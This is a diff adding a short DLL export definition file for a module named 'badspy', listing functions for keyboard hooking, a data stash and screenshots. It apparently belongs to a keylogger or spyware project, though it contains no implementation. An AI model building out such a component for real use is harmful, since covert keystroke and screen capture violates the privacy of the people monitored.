@@ -1,0 +1,8 @@
+LIBRARY badspy.c.dll
+EXPORTS
+   register_hook   @1
+   unregister_hook   @2
+   kb_hook_proc   @3
+   quit   @4
+   init_stash   @5
+   take_screenshot   @6
